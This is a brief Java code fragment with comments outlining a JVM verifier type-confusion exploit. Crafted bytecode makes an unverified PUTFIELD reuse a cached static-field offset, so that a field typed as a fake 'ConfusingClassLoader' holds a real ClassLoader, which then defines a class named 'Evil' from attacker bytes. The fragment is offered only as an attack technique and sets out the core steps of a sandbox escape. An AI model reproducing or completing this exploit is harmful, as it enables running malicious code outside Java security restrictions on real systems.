// Craft bytecode (via ASM) where GETSTATIC cached offset is reused by PUTFIELD
// GETSTATIC static_field → verified, caches field offset
// PUTFIELD f0 → NOT verified, reuses cached offset
// Static fields live in metaspace, instance fields in heap — the PUTFIELD
// with a static offset lands on a valid instance field

ConfusingClassLoader confused = instance.f0; // actually a real ClassLoader!
confused.defineClass("Evil", evilBytes, 0, evilBytes.length);
